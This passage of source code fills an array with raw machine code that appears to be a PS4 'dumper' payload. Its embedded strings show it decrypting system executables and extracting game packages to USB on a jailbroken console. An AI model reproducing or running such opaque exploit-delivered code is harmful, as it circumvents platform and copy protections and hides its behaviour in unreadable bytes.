  payload_writer[3520] = 0xe8000013;
  payload_writer[3521] = 0xfffff111;
  payload_writer[3522] = 0x8d48df89;
  payload_writer[3523] = 0x001a2715;
  payload_writer[3524] = 0x358d4800;
  payload_writer[3525] = 0x000013be;
  payload_writer[3526] = 0xfff0fce8;
  payload_writer[3527] = 0x48df89ff;
  payload_writer[3528] = 0x1932158d;
  payload_writer[3529] = 0x8d480000;
  payload_writer[3530] = 0x0013b035;
  payload_writer[3531] = 0xf0e7e800;
  payload_writer[3532] = 0xdf89ffff;
  payload_writer[3533] = 0xe5158d48;
  payload_writer[3534] = 0x48000019;
  payload_writer[3535] = 0x13a2358d;
  payload_writer[3536] = 0xd2e80000;
  payload_writer[3537] = 0x89fffff0;
  payload_writer[3538] = 0x158d48df;
  payload_writer[3539] = 0x00001990;
  payload_writer[3540] = 0x95358d48;
  payload_writer[3541] = 0xe8000013;
  payload_writer[3542] = 0xfffff0bd;
  payload_writer[3543] = 0x8d48df89;
  payload_writer[3544] = 0x0019e315;
  payload_writer[3545] = 0x358d4800;
  payload_writer[3546] = 0x00001387;
  payload_writer[3547] = 0xfff0a8e8;
  payload_writer[3548] = 0x48df89ff;
  payload_writer[3549] = 0x1a8e158d;
  payload_writer[3550] = 0x8d480000;
  payload_writer[3551] = 0x00137a35;
  payload_writer[3552] = 0xf093e800;
  payload_writer[3553] = 0xdf89ffff;
  payload_writer[3554] = 0x29158d48;
  payload_writer[3555] = 0x4800001a;
  payload_writer[3556] = 0x136c358d;
  payload_writer[3557] = 0x7ee80000;
  payload_writer[3558] = 0x89fffff0;
  payload_writer[3559] = 0x158d48df;
  payload_writer[3560] = 0x00001974;
  payload_writer[3561] = 0x5e358d48;
  payload_writer[3562] = 0xe8000013;
  payload_writer[3563] = 0xfffff069;
  payload_writer[3564] = 0x8d48df89;
  payload_writer[3565] = 0x001a1715;
  payload_writer[3566] = 0x358d4800;
  payload_writer[3567] = 0x00001351;
  payload_writer[3568] = 0xfff054e8;
  payload_writer[3569] = 0x48df89ff;
  payload_writer[3570] = 0x18a2158d;
  payload_writer[3571] = 0x8d480000;
  payload_writer[3572] = 0x00134435;
  payload_writer[3573] = 0xf03fe800;
  payload_writer[3574] = 0xdf89ffff;
  payload_writer[3575] = 0x5d158d48;
  payload_writer[3576] = 0x48000019;
  payload_writer[3577] = 0x1338358d;
  payload_writer[3578] = 0x2ae80000;
  payload_writer[3579] = 0x89fffff0;
  payload_writer[3580] = 0x158d48df;
  payload_writer[3581] = 0x00001a18;
  payload_writer[3582] = 0x2a358d48;
  payload_writer[3583] = 0xe8000013;
  payload_writer[3584] = 0xfffff015;
  payload_writer[3585] = 0x8d48df89;
  payload_writer[3586] = 0x0018a315;
  payload_writer[3587] = 0x358d4800;
  payload_writer[3588] = 0x0000131c;
  payload_writer[3589] = 0xfff000e8;
  payload_writer[3590] = 0x48df89ff;
  payload_writer[3591] = 0x18d6158d;
  payload_writer[3592] = 0x8d480000;
  payload_writer[3593] = 0x00130f35;
  payload_writer[3594] = 0xefebe800;
  payload_writer[3595] = 0xdf89ffff;
  payload_writer[3596] = 0x29158d48;
  payload_writer[3597] = 0x48000019;
  payload_writer[3598] = 0x1301358d;
  payload_writer[3599] = 0xd6e80000;
  payload_writer[3600] = 0x89ffffef;
  payload_writer[3601] = 0x158d48df;
  payload_writer[3602] = 0x0000191c;
  payload_writer[3603] = 0xf4358d48;
  payload_writer[3604] = 0xe8000012;
  payload_writer[3605] = 0xffffefc1;
  payload_writer[3606] = 0x8d48df89;
  payload_writer[3607] = 0x00185f15;
  payload_writer[3608] = 0x358d4800;
  payload_writer[3609] = 0x000012de;
  payload_writer[3610] = 0xffeface8;
  payload_writer[3611] = 0x48df89ff;
  payload_writer[3612] = 0x1972158d;
  payload_writer[3613] = 0x8d480000;
  payload_writer[3614] = 0x0012d035;
  payload_writer[3615] = 0xef97e800;
  payload_writer[3616] = 0xdf89ffff;
  payload_writer[3617] = 0x6d158d48;
  payload_writer[3618] = 0x48000019;
  payload_writer[3619] = 0x12c3358d;
  payload_writer[3620] = 0x82e80000;
  payload_writer[3621] = 0x89ffffef;
  payload_writer[3622] = 0x158d48df;
  payload_writer[3623] = 0x00001870;
  payload_writer[3624] = 0xb3358d48;
  payload_writer[3625] = 0xe8000012;
  payload_writer[3626] = 0xffffef6d;
  payload_writer[3627] = 0x8d48df89;
  payload_writer[3628] = 0x0017b315;
  payload_writer[3629] = 0x358d4800;
  payload_writer[3630] = 0x000012a6;
  payload_writer[3631] = 0xffef58e8;
  payload_writer[3632] = 0x48df89ff;
  payload_writer[3633] = 0x17fe158d;
  payload_writer[3634] = 0x8d480000;
  payload_writer[3635] = 0x00129a35;
  payload_writer[3636] = 0xef43e800;
  payload_writer[3637] = 0xdf89ffff;
  payload_writer[3638] = 0x79158d48;
  payload_writer[3639] = 0x48000018;
  payload_writer[3640] = 0x1290358d;
  payload_writer[3641] = 0x2ee80000;
  payload_writer[3642] = 0x89ffffef;
  payload_writer[3643] = 0x158d48df;
  payload_writer[3644] = 0x0000183c;
  payload_writer[3645] = 0x82358d48;
  payload_writer[3646] = 0xe8000012;
  payload_writer[3647] = 0xffffef19;
  payload_writer[3648] = 0x8d48df89;
  payload_writer[3649] = 0x00188f15;
  payload_writer[3650] = 0x358d4800;
  payload_writer[3651] = 0x00001273;
  payload_writer[3652] = 0xffef04e8;
  payload_writer[3653] = 0x48df89ff;
  payload_writer[3654] = 0x17e2158d;
  payload_writer[3655] = 0x8d480000;
  payload_writer[3656] = 0x00125f35;
  payload_writer[3657] = 0xeeefe800;
  payload_writer[3658] = 0xdf89ffff;
  payload_writer[3659] = 0x2d158d48;
  payload_writer[3660] = 0x48000017;
  payload_writer[3661] = 0x124f358d;
  payload_writer[3662] = 0xdae80000;
  payload_writer[3663] = 0x89ffffee;
  payload_writer[3664] = 0x158d48df;
  payload_writer[3665] = 0x00001830;
  payload_writer[3666] = 0x42358d48;
  payload_writer[3667] = 0xe8000012;
  payload_writer[3668] = 0xffffeec5;
  payload_writer[3669] = 0x8d48df89;
  payload_writer[3670] = 0x00177b15;
  payload_writer[3671] = 0x358d4800;
  payload_writer[3672] = 0x00001227;
  payload_writer[3673] = 0xffeeb0e8;
  payload_writer[3674] = 0x48df89ff;
  payload_writer[3675] = 0x1866158d;
  payload_writer[3676] = 0x8d480000;
  payload_writer[3677] = 0x00121a35;
  payload_writer[3678] = 0xee9be800;
  payload_writer[3679] = 0xdf89ffff;
  payload_writer[3680] = 0x21158d48;
  payload_writer[3681] = 0x48000018;
  payload_writer[3682] = 0x11fe358d;
  payload_writer[3683] = 0x86e80000;
  payload_writer[3684] = 0x89ffffee;
  payload_writer[3685] = 0x158d48df;
  payload_writer[3686] = 0x00001864;
  payload_writer[3687] = 0xf8358d48;
  payload_writer[3688] = 0xe8000011;
  payload_writer[3689] = 0xffffee71;
  payload_writer[3690] = 0x8d48df89;
  payload_writer[3691] = 0x00180f15;
  payload_writer[3692] = 0x358d4800;
  payload_writer[3693] = 0x000011ea;
  payload_writer[3694] = 0xffee5ce8;
  payload_writer[3695] = 0x48df89ff;
  payload_writer[3696] = 0x17ba158d;
  payload_writer[3697] = 0x8d480000;
  payload_writer[3698] = 0x0011de35;
  payload_writer[3699] = 0xee47e800;
  payload_writer[3700] = 0xdf89ffff;
  payload_writer[3701] = 0x05158d48;
  payload_writer[3702] = 0x48000018;
  payload_writer[3703] = 0x11d3358d;
  payload_writer[3704] = 0x32e80000;
  payload_writer[3705] = 0x89ffffee;
  payload_writer[3706] = 0x158d48df;
  payload_writer[3707] = 0x00001700;
  payload_writer[3708] = 0xca358d48;
  payload_writer[3709] = 0xe8000011;
  payload_writer[3710] = 0xffffee1d;
  payload_writer[3711] = 0x8d48df89;
  payload_writer[3712] = 0x0017ab15;
  payload_writer[3713] = 0x358d4800;
  payload_writer[3714] = 0x000011bc;
  payload_writer[3715] = 0xffee08e8;
  payload_writer[3716] = 0x48df89ff;
  payload_writer[3717] = 0x168e158d;
  payload_writer[3718] = 0x8d480000;
  payload_writer[3719] = 0x0011af35;
  payload_writer[3720] = 0xedf3e800;
  payload_writer[3721] = 0xdf89ffff;
  payload_writer[3722] = 0x69158d48;
  payload_writer[3723] = 0x48000016;
  payload_writer[3724] = 0x11a2358d;
  payload_writer[3725] = 0xdee80000;
  payload_writer[3726] = 0x89ffffed;
  payload_writer[3727] = 0x158d48df;
  payload_writer[3728] = 0x000017dc;
  payload_writer[3729] = 0x97358d48;
  payload_writer[3730] = 0xe8000011;
  payload_writer[3731] = 0xffffedc9;
  payload_writer[3732] = 0x8d48df89;
  payload_writer[3733] = 0x00162715;
  payload_writer[3734] = 0x358d4800;
  payload_writer[3735] = 0x0000118a;
  payload_writer[3736] = 0xffedb4e8;
  payload_writer[3737] = 0x48df89ff;
  payload_writer[3738] = 0x161a158d;
  payload_writer[3739] = 0x8d480000;
  payload_writer[3740] = 0x00117d35;
  payload_writer[3741] = 0xed9fe800;
  payload_writer[3742] = 0xdf89ffff;
  payload_writer[3743] = 0x95158d48;
  payload_writer[3744] = 0x48000017;
  payload_writer[3745] = 0x1172358d;
  payload_writer[3746] = 0x8ae80000;
  payload_writer[3747] = 0x89ffffed;
  payload_writer[3748] = 0x158d48df;
  payload_writer[3749] = 0x00001670;
  payload_writer[3750] = 0x66358d48;
  payload_writer[3751] = 0xe8000011;
  payload_writer[3752] = 0xffffed75;
  payload_writer[3753] = 0x8d48df89;
  payload_writer[3754] = 0x0015f315;
  payload_writer[3755] = 0x358d4800;
  payload_writer[3756] = 0x00001157;
  payload_writer[3757] = 0xffed60e8;
  payload_writer[3758] = 0x48df89ff;
  payload_writer[3759] = 0x16ae158d;
  payload_writer[3760] = 0x8d480000;
  payload_writer[3761] = 0x00114e35;
  payload_writer[3762] = 0xed4be800;
  payload_writer[3763] = 0xdf89ffff;
  payload_writer[3764] = 0x79158d48;
  payload_writer[3765] = 0x48000016;
  payload_writer[3766] = 0x113f358d;
  payload_writer[3767] = 0x36e80000;
  payload_writer[3768] = 0x89ffffed;
  payload_writer[3769] = 0x158d48df;
  payload_writer[3770] = 0x00001704;
  payload_writer[3771] = 0x30358d48;
  payload_writer[3772] = 0xe8000011;
  payload_writer[3773] = 0xffffed21;
  payload_writer[3774] = 0x8d48df89;
  payload_writer[3775] = 0x0015e715;
  payload_writer[3776] = 0x358d4800;
  payload_writer[3777] = 0x00001122;
  payload_writer[3778] = 0xffed0ce8;
  payload_writer[3779] = 0x48df89ff;
  payload_writer[3780] = 0x167a158d;
  payload_writer[3781] = 0x8d480000;
  payload_writer[3782] = 0x00111335;
  payload_writer[3783] = 0xecf7e800;
  payload_writer[3784] = 0xdf89ffff;
  payload_writer[3785] = 0x75158d48;
  payload_writer[3786] = 0x48000016;
  payload_writer[3787] = 0x1104358d;
  payload_writer[3788] = 0xe2e80000;
  payload_writer[3789] = 0x89ffffec;
  payload_writer[3790] = 0x8d485bdf;
  payload_writer[3791] = 0x00158f15;
  payload_writer[3792] = 0x358d4800;
  payload_writer[3793] = 0x000010f5;
  payload_writer[3794] = 0xffeccce9;
  payload_writer[3795] = 0x415641ff;
  payload_writer[3796] = 0x49544155;
  payload_writer[3797] = 0xbe55f489;
  payload_writer[3798] = 0x00000601;
  payload_writer[3799] = 0xd5894853;
  payload_writer[3800] = 0x0001ffba;
  payload_writer[3801] = 0xecf9e800;
  payload_writer[3802] = 0xf883ffff;
  payload_writer[3803] = 0x90840fff;
  payload_writer[3804] = 0x41000000;
  payload_writer[3805] = 0xbe41c589;
  payload_writer[3806] = 0x00100000;
  payload_writer[3807] = 0x74ed8548;
  payload_writer[3808] = 0xc93d8b72;
  payload_writer[3809] = 0x48000016;
  payload_writer[3810] = 0x0000fd81;
  payload_writer[3811] = 0x894c0010;
  payload_writer[3812] = 0x460f48f3;
  payload_writer[3813] = 0xe6894cdd;
  payload_writer[3814] = 0x2948d231;
  payload_writer[3815] = 0xed99e8dd;
  payload_writer[3816] = 0x8b48ffff;
  payload_writer[3817] = 0x00169735;
  payload_writer[3818] = 0xda894800;
  payload_writer[3819] = 0x169e3d8b;
  payload_writer[3820] = 0x94e80000;
  payload_writer[3821] = 0x48ffffec;
  payload_writer[3822] = 0x1682358b;
  payload_writer[3823] = 0x89480000;
  payload_writer[3824] = 0xef8944da;
  payload_writer[3825] = 0xffec8ee8;
  payload_writer[3826] = 0x1d0348ff;
  payload_writer[3827] = 0x00001688;
  payload_writer[3828] = 0x59058b48;
  payload_writer[3829] = 0x48000016;
  payload_writer[3830] = 0x167a1d89;
  payload_writer[3831] = 0x39480000;
  payload_writer[3832] = 0x480776c3;
  payload_writer[3833] = 0x166e0589;
  payload_writer[3834] = 0x81490000;
  payload_writer[3835] = 0x100000c4;
  payload_writer[3836] = 0x5b89eb00;
  payload_writer[3837] = 0x5def8944;
  payload_writer[3838] = 0x5d415c41;
  payload_writer[3839] = 0x6ce95e41;
  payload_writer[3840] = 0x5bffffec;
  payload_writer[3841] = 0x415c415d;
  payload_writer[3842] = 0xc35e415d;
  payload_writer[3843] = 0x41ff6348;
  payload_writer[3844] = 0xc7694857;
  payload_writer[3845] = 0x000000a8;
  payload_writer[3846] = 0x55415641;
  payload_writer[3847] = 0x53555441;
  payload_writer[3848] = 0x48f78941;
  payload_writer[3849] = 0x4528ec83;
  payload_writer[3850] = 0x8948f631;
  payload_writer[3851] = 0x8d082444;
  payload_writer[3852] = 0x89480146;
  payload_writer[3853] = 0x4c892414;
  payload_writer[3854] = 0x44891824;
  payload_writer[3855] = 0x8b481c24;
  payload_writer[3856] = 0x48082444;
  payload_writer[3857] = 0x15ee0503;
  payload_writer[3858] = 0x3b440000;
  payload_writer[3859] = 0x830f6070;
  payload_writer[3860] = 0x000001bb;
  payload_writer[3861] = 0xed158b48;
  payload_writer[3862] = 0x8b000015;
  payload_writer[3863] = 0x8944206a;
  payload_writer[3864] = 0x645003f2;
  payload_writer[3865] = 0xeaaf0f48;
  payload_writer[3866] = 0x48e98948;
  payload_writer[3867] = 0x48084803;
  payload_writer[3868] = 0x10244c89;
  payload_writer[3869] = 0x246c3b48;
  payload_writer[3870] = 0x88830f10;
  payload_writer[3871] = 0xbf000001;
  payload_writer[3872] = 0x00000010;
  payload_writer[3873] = 0x140615ff;
  payload_writer[3874] = 0x3d8b0000;
  payload_writer[3875] = 0x000015c0;
  payload_writer[3876] = 0x8948d231;
  payload_writer[3877] = 0xc38948ee;
  payload_writer[3878] = 0xffec9ee8;
  payload_writer[3879] = 0xad3d8bff;
  payload_writer[3880] = 0xba000015;
  payload_writer[3881] = 0x00000010;
  payload_writer[3882] = 0xe8de8948;
  payload_writer[3883] = 0xffffeb9b;
  payload_writer[3884] = 0x00047b83;
  payload_writer[3885] = 0x89480e75;
  payload_writer[3886] = 0x6915ffdf;
  payload_writer[3887] = 0xe9000015;
  payload_writer[3888] = 0x00000143;
  payload_writer[3889] = 0x8d08438b;
  payload_writer[3890] = 0x15ff0178;
  payload_writer[3891] = 0x000013c0;
  payload_writer[3892] = 0x8949f631;
  payload_writer[3893] = 0x08438bc5;
  payload_writer[3894] = 0x8def894c;
  payload_writer[3895] = 0x15ff0150;
  payload_writer[3896] = 0x000014a4;
  payload_writer[3897] = 0x7eff8545;
  payload_writer[3898] = 0x613d8b22;
  payload_writer[3899] = 0x48000015;
  payload_writer[3900] = 0x3110758d;
  payload_writer[3901] = 0xec41e8d2;
  payload_writer[3902] = 0x538bffff;
  payload_writer[3903] = 0xee894c08;
  payload_writer[3904] = 0x154a3d8b;
  payload_writer[3905] = 0x40e80000;
  payload_writer[3906] = 0x48ffffeb;
  payload_writer[3907] = 0x4c243c8b;
  payload_writer[3908] = 0x137a258b;
  payload_writer[3909] = 0x15ff0000;
  payload_writer[3910] = 0x000014ec;
  payload_writer[3911] = 0x4808538b;
  payload_writer[3912] = 0x02107c8d;
  payload_writer[3913] = 0x48d4ff41;
  payload_writer[3914] = 0x00243c83;
  payload_writer[3915] = 0x4cc48949;
  payload_writer[3916] = 0x149a058b;
  payload_writer[3917] = 0x18740000;
  payload_writer[3918] = 0x24148b48;
  payload_writer[3919] = 0x4cc78948;
  payload_writer[3920] = 0x8d48e989;
  payload_writer[3921] = 0x0002c735;
  payload_writer[3922] = 0x41c03100;
  payload_writer[3923] = 0x12ebd0ff;
  payload_writer[3924] = 0x4cc78948;
  payload_writer[3925] = 0x8d48ea89;
  payload_writer[3926] = 0x00058235;
  payload_writer[3927] = 0x41c03100;
  payload_writer[3928] = 0x438bd0ff;
  payload_writer[3929] = 0x02f88304;
  payload_writer[3930] = 0x85455375;
  payload_writer[3931] = 0x83727eff;
  payload_writer[3932] = 0x0018247c;
  payload_writer[3933] = 0x8b48138b;
  payload_writer[3934] = 0x0014bb05;
  payload_writer[3935] = 0x48157400;
  payload_writer[3936] = 0x00a8d269;
  payload_writer[3937] = 0x8b480000;
  payload_writer[3938] = 0x48081044;
  payload_writer[3939] = 0x149e0501;
  payload_writer[3940] = 0x4deb0000;
  payload_writer[3941] = 0xa8d26948;
  payload_writer[3942] = 0x48000000;
  payload_writer[3943] = 0x14a60d8b;
  payload_writer[3944] = 0x894c0000;
  payload_writer[3945] = 0x20718be7;
  payload_writer[3946] = 0x48d00148;
  payload_writer[3947] = 0x8b08508b;
  payload_writer[3948] = 0x0f486440;
  payload_writer[3949] = 0x92e8f0af;
  payload_writer[3950] = 0xebfffffd;
  payload_writer[3951] = 0x03f88324;
  payload_writer[3952] = 0xffbe1f75;
  payload_writer[3953] = 0x4c000001;
  payload_writer[3954] = 0x24e8e789;
  payload_writer[3955] = 0x8bffffeb;
  payload_writer[3956] = 0x4c18244c;
  payload_writer[3957] = 0x748be289;
  payload_writer[3958] = 0x3b8b1c24;
  payload_writer[3959] = 0xfffe2be8;
  payload_writer[3960] = 0x0c438bff;
  payload_writer[3961] = 0x48df8948;
  payload_writer[3962] = 0x15ffc501;
  payload_writer[3963] = 0x00001438;
  payload_writer[3964] = 0xffef894c;
  payload_writer[3965] = 0x00142f15;
  payload_writer[3966] = 0xe7894c00;
  payload_writer[3967] = 0x142615ff;
  payload_writer[3968] = 0x6de90000;
  payload_writer[3969] = 0x41fffffe;
  payload_writer[3970] = 0x2fe9c6ff;
  payload_writer[3971] = 0x48fffffe;
  payload_writer[3972] = 0x5b28c483;
  payload_writer[3973] = 0x415c415d;
  payload_writer[3974] = 0x415e415d;
  payload_writer[3975] = 0x5741c35f;
  payload_writer[3976] = 0x55415641;
  payload_writer[3977] = 0x48555441;
  payload_writer[3978] = 0xbf53fd89;
  payload_writer[3979] = 0x00100000;
  payload_writer[3980] = 0xf3894851;
  payload_writer[3981] = 0x125615ff;
  payload_writer[3982] = 0xffbe0000;
  payload_writer[3983] = 0x48000001;
  payload_writer[3984] = 0x8948df89;
  payload_writer[3985] = 0x0013f705;
  payload_writer[3986] = 0xeaa5e800;
  payload_writer[3987] = 0xd231ffff;
  payload_writer[3988] = 0x8948f631;
  payload_writer[3989] = 0xea09e8ef;
  payload_writer[3990] = 0xca83ffff;
  payload_writer[3991] = 0x89c085ff;
  payload_writer[3992] = 0x0013eb05;
  payload_writer[3993] = 0x53880f00;
  payload_writer[3994] = 0xbf000001;
  payload_writer[3995] = 0x00000050;
  payload_writer[3996] = 0xffed3145;
  payload_writer[3997] = 0x00121715;
  payload_writer[3998] = 0xd13d8b00;
  payload_writer[3999] = 0x31000013;
  payload_writer[4000] = 0x48f631d2;
  payload_writer[4001] = 0x13be0589;
  payload_writer[4002] = 0xed310000;
  payload_writer[4003] = 0xffeaaae8;
  payload_writer[4004] = 0x358b48ff;
  payload_writer[4005] = 0x000013b0;
  payload_writer[4006] = 0x000050ba;
  payload_writer[4007] = 0xad3d8b00;
  payload_writer[4008] = 0xe8000013;
  payload_writer[4009] = 0xffffe9a3;
  payload_writer[4010] = 0x99058b48;
  payload_writer[4011] = 0x48000013;
  payload_writer[4012] = 0xa8307869;
  payload_writer[4013] = 0xff000000;
  payload_writer[4014] = 0x0011d315;
  payload_writer[4015] = 0x05894800;
  payload_writer[4016] = 0x00001374;
  payload_writer[4017] = 0x7d058b48;
  payload_writer[4018] = 0x44000013;
  payload_writer[4019] = 0x3b48ea89;
  payload_writer[4020] = 0x76734050;
  payload_writer[4021] = 0x01658d45;
  payload_writer[4022] = 0x4def8941;
  payload_writer[4023] = 0x8b48e589;
  payload_writer[4024] = 0x0013633d;
  payload_writer[4025] = 0x41d23100;
  payload_writer[4026] = 0x0000a8b8;
  payload_writer[4027] = 0xf9894400;
  payload_writer[4028] = 0x778be929;
  payload_writer[4029] = 0x41f08920;
  payload_writer[4030] = 0xc139f0f7;
  payload_writer[4031] = 0x89440572;
  payload_writer[4032] = 0x45c1ebfd;
  payload_writer[4033] = 0x3b4cfe89;
  payload_writer[4034] = 0xf2733077;
  payload_writer[4035] = 0xa8c96948;
  payload_writer[4036] = 0x8b000000;
  payload_writer[4037] = 0x0013373d;
  payload_writer[4038] = 0x41d23100;
  payload_writer[4039] = 0x0f49c7ff;
  payload_writer[4040] = 0x0148f4af;
  payload_writer[4041] = 0xea11e8ce;
  payload_writer[4042] = 0x6949ffff;
  payload_writer[4043] = 0x0000a8f6;
  payload_writer[4044] = 0x193d8b00;
  payload_writer[4045] = 0xba000013;
  payload_writer[4046] = 0x000000a8;
  payload_writer[4047] = 0xf5350348;
  payload_writer[4048] = 0xe8000012;
  payload_writer[4049] = 0xffffe903;
  payload_writer[4050] = 0x8b4894eb;
  payload_writer[4051] = 0x01b94878;
  payload_writer[4052] = 0x48000000;
  payload_writer[4053] = 0xf631da89;
  payload_writer[4054] = 0xcd05c748;
  payload_writer[4055] = 0x00000012;
  payload_writer[4056] = 0x48000000;
  payload_writer[4057] = 0x12ea05c7;
  payload_writer[4058] = 0x00000000;
  payload_writer[4059] = 0x99e80000;
  payload_writer[4060] = 0x48fffffc;
  payload_writer[4061] = 0x12ce058b;
  payload_writer[4062] = 0x89480000;
  payload_writer[4063] = 0x31c931da;
  payload_writer[4064] = 0x788b48f6;
  payload_writer[4065] = 0xfc82e848;
  payload_writer[4066] = 0x8b48ffff;
  payload_writer[4067] = 0x0012b73d;
  payload_writer[4068] = 0x9115ff00;
  payload_writer[4069] = 0x48000012;
  payload_writer[4070] = 0x129a3d8b;
  payload_writer[4071] = 0x15ff0000;
  payload_writer[4072] = 0x00001284;
  payload_writer[4073] = 0x12a63d8b;
  payload_writer[4074] = 0xc0e80000;
  payload_writer[4075] = 0x48ffffe8;
  payload_writer[4076] = 0x128a3d8b;
  payload_writer[4077] = 0x15ff0000;
  payload_writer[4078] = 0x0000126c;
  payload_writer[4079] = 0xd089d231;
  payload_writer[4080] = 0x415d5b5a;
  payload_writer[4081] = 0x415d415c;
  payload_writer[4082] = 0xc35f415e;
  payload_writer[4083] = 0x49c03148;
  payload_writer[4084] = 0x050fca89;
  payload_writer[4085] = 0x48c30172;
  payload_writer[4086] = 0x0f413d83;
  payload_writer[4087] = 0x74000000;
  payload_writer[4088] = 0x15ff5018;
  payload_writer[4089] = 0x00000f38;
  payload_writer[4090] = 0x48088959;
  payload_writer[4091] = 0xffffc0c7;
  payload_writer[4092] = 0xc748ffff;
  payload_writer[4093] = 0xffffffc2;
  payload_writer[4094] = 0x7073c3ff;
  payload_writer[4095] = 0x0074696c;
  payload_writer[4096] = 0x69746f6e;
  payload_writer[4097] = 0x73007966;
  payload_writer[4098] = 0x64747568;
  payload_writer[4099] = 0x006e776f;
  payload_writer[4100] = 0x252f7325;
  payload_writer[4101] = 0x73250073;
  payload_writer[4102] = 0x6d75642e;
  payload_writer[4103] = 0x676e6970;
  payload_writer[4104] = 0x2e732500;
  payload_writer[4105] = 0x706d6f63;
  payload_writer[4106] = 0x6574656c;
  payload_writer[4107] = 0x2d732500;
  payload_writer[4108] = 0x00707061;
  payload_writer[4109] = 0x702d7325;
  payload_writer[4110] = 0x68637461;
  payload_writer[4111] = 0x73752f00;
  payload_writer[4112] = 0x612f7265;
  payload_writer[4113] = 0x252f7070;
  payload_writer[4114] = 0x70612f73;
  payload_writer[4115] = 0x6b702e70;
  payload_writer[4116] = 0x78450067;
  payload_writer[4117] = 0x63617274;
  payload_writer[4118] = 0x676e6974;
  payload_writer[4119] = 0x70706120;
  payload_writer[4120] = 0x63617020;
  payload_writer[4121] = 0x6567616b;
  payload_writer[4122] = 0x002e2e2e;
  payload_writer[4123] = 0x7379732f;
  payload_writer[4124] = 0x5f6d6574;
  payload_writer[4125] = 0x61746164;
  payload_writer[4126] = 0x6972702f;
  payload_writer[4127] = 0x70612f76;
  payload_writer[4128] = 0x74656d70;
  payload_writer[4129] = 0x73252f61;
  payload_writer[4130] = 0x74706e2f;
  payload_writer[4131] = 0x656c7469;
  payload_writer[4132] = 0x7461642e;
  payload_writer[4133] = 0x2f732500;
  payload_writer[4134] = 0x5f656373;
  payload_writer[4135] = 0x2f737973;
  payload_writer[4136] = 0x6974706e;
  payload_writer[4137] = 0x2e656c74;
  payload_writer[4138] = 0x00746164;
  payload_writer[4139] = 0x7379732f;
  payload_writer[4140] = 0x5f6d6574;
  payload_writer[4141] = 0x61746164;
  payload_writer[4142] = 0x6972702f;
  payload_writer[4143] = 0x70612f76;
  payload_writer[4144] = 0x74656d70;
  payload_writer[4145] = 0x73252f61;
  payload_writer[4146] = 0x62706e2f;
  payload_writer[4147] = 0x2e646e69;
  payload_writer[4148] = 0x00746164;
  payload_writer[4149] = 0x732f7325;
  payload_writer[4150] = 0x735f6563;
  payload_writer[4151] = 0x6e2f7379;
  payload_writer[4152] = 0x6e696270;
  payload_writer[4153] = 0x61642e64;
  payload_writer[4154] = 0x752f0074;
  payload_writer[4155] = 0x2f726573;
  payload_writer[4156] = 0x63746170;
  payload_writer[4157] = 0x73252f68;
  payload_writer[4158] = 0x7461702f;
  payload_writer[4159] = 0x702e6863;
  payload_writer[4160] = 0x4500676b;
  payload_writer[4161] = 0x61727478;
  payload_writer[4162] = 0x6e697463;
  payload_writer[4163] = 0x61702067;
  payload_writer[4164] = 0x20686374;
  payload_writer[4165] = 0x6b636170;
  payload_writer[4166] = 0x2e656761;
  payload_writer[4167] = 0x4d002e2e;
  payload_writer[4168] = 0x69677265;
  payload_writer[4169] = 0x7020676e;
  payload_writer[4170] = 0x68637461;
  payload_writer[4171] = 0x63617020;
  payload_writer[4172] = 0x6567616b;
  payload_writer[4173] = 0x002e2e2e;
  payload_writer[4174] = 0x746e6d2f;
  payload_writer[4175] = 0x6e61732f;
  payload_writer[4176] = 0x786f6264;
  payload_writer[4177] = 0x7366702f;
  payload_writer[4178] = 0x2f746e6d;
  payload_writer[4179] = 0x612d7325;
  payload_writer[4180] = 0x2d307070;
  payload_writer[4181] = 0x7473656e;
  payload_writer[4182] = 0x7366702f;
  payload_writer[4183] = 0x616d695f;
  payload_writer[4184] = 0x642e6567;
  payload_writer[4185] = 0x45007461;
  payload_writer[4186] = 0x61727478;
  payload_writer[4187] = 0x6e697463;
  payload_writer[4188] = 0x70612067;
  payload_writer[4189] = 0x6d692070;
  payload_writer[4190] = 0x2e656761;
  payload_writer[4191] = 0x2f002e2e;
  payload_writer[4192] = 0x2f746e6d;
  payload_writer[4193] = 0x646e6173;
  payload_writer[4194] = 0x2f786f62;
  payload_writer[4195] = 0x6d736670;
  payload_writer[4196] = 0x252f746e;
  payload_writer[4197] = 0x61702d73;
  payload_writer[4198] = 0x30686374;
  payload_writer[4199] = 0x73656e2d;
  payload_writer[4200] = 0x66702f74;
  payload_writer[4201] = 0x6d695f73;
  payload_writer[4202] = 0x2e656761;
  payload_writer[4203] = 0x00746164;
  payload_writer[4204] = 0x72747845;
  payload_writer[4205] = 0x69746361;
  payload_writer[4206] = 0x7020676e;
  payload_writer[4207] = 0x68637461;
  payload_writer[4208] = 0x616d6920;
  payload_writer[4209] = 0x2e2e6567;
  payload_writer[4210] = 0x7041002e;
  payload_writer[4211] = 0x69796c70;
  payload_writer[4212] = 0x7020676e;
  payload_writer[4213] = 0x68637461;
  payload_writer[4214] = 0x002e2e2e;
  payload_writer[4215] = 0x746e6d2f;
  payload_writer[4216] = 0x6e61732f;
  payload_writer[4217] = 0x786f6264;
  payload_writer[4218] = 0x7366702f;
  payload_writer[4219] = 0x2f746e6d;
  payload_writer[4220] = 0x612d7325;
  payload_writer[4221] = 0x00307070;
  payload_writer[4222] = 0x72636544;
  payload_writer[4223] = 0x69747079;
  payload_writer[4224] = 0x7320676e;
  payload_writer[4225] = 0x73666c65;
  payload_writer[4226] = 0x002e2e2e;
  payload_writer[4227] = 0x746e6d2f;
  payload_writer[4228] = 0x6e61732f;
  payload_writer[4229] = 0x786f6264;
  payload_writer[4230] = 0x7366702f;
  payload_writer[4231] = 0x2f746e6d;
  payload_writer[4232] = 0x702d7325;
  payload_writer[4233] = 0x68637461;
  payload_writer[4234] = 0x65440030;
  payload_writer[4235] = 0x70797263;
  payload_writer[4236] = 0x676e6974;
  payload_writer[4237] = 0x74617020;
  payload_writer[4238] = 0x2e2e6863;
  payload_writer[4239] = 0x746e002e;
  payload_writer[4240] = 0x61657268;
  payload_writer[4241] = 0x65570064;
  payload_writer[4242] = 0x6d6f636c;
  payload_writer[4243] = 0x6f742065;
  payload_writer[4244] = 0x34535020;
  payload_writer[4245] = 0x4d55442d;
  payload_writer[4246] = 0x00524550;
  payload_writer[4247] = 0x74696157;
  payload_writer[4248] = 0x20676e69;
  payload_writer[4249] = 0x20726f66;
  payload_writer[4250] = 0x20425355;
  payload_writer[4251] = 0x6b736964;
  payload_writer[4252] = 0x002e2e2e;
  payload_writer[4253] = 0x642f7325;
  payload_writer[4254] = 0x65706d75;
  payload_writer[4255] = 0x66632e72;
  payload_writer[4256] = 0x61570067;
